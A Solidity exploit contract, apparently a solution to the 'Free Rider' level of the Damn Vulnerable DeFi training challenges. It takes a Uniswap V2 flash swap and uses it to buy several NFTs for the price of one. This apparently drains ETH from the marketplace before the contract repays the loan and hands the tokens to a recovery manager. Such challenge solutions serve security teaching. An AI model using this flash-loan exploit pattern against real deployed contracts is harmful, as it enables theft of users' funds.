// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    uint256 constant amount_b = 15 ether;

    IUniswapV2Pair pair;
    WETH weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    address recoveryManager;

    constructor(address pairAddress, address _weth, address _marketplace, address _recoveryManager) payable {
        pair = IUniswapV2Pair(pairAddress);
        weth = WETH(payable(_weth));
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        weth.deposit{value: msg.value}();
        nft = DamnValuableNFT(marketplace.token());
        nft.setApprovalForAll(address(marketplace), true);
        recoveryManager = _recoveryManager;
    }

    function flanshloan() external {
        address token0 = pair.token0();
        // address token1 = pair.token1();

        uint256 amount0;
        uint256 amount1;
        if (token0 == address(weth)) {
            amount0 = amount_b;
        } else {
            amount1 = amount_b;
        }

        bytes memory data = abi.encodeCall(AttackFreeRider.attack, ());

        pair.swap(amount0, amount1, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "error pair");
        uint256 amount = amount0 > 0 ? amount0 : amount1;
        weth.withdraw(amount);

        // execute the data
        (bool success,) = sender.call(data);
        require(success);

        // fee / (amount + fee) = 3/1000
        weth.transfer(msg.sender, amount + amount * 31 / 10000);
    }

    function attack() external payable {
        require(address(this).balance == amount_b, "error 15 ETH");
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: amount_b}(tokenIds);
        uint256[] memory tokenIds_o = new uint256[](2);
        tokenIds_o[0] = 0;
        tokenIds_o[1] = 1;
        uint256[] memory prices_o = new uint256[](2);
        prices_o[0] = amount_b;
        prices_o[1] = amount_b;
        marketplace.offerMany(tokenIds_o, prices_o);
        marketplace.buyMany{value: amount_b}(tokenIds_o);

        weth.deposit{value: amount_b}();

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, tokenIds[i], abi.encode(tx.origin));
        }
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
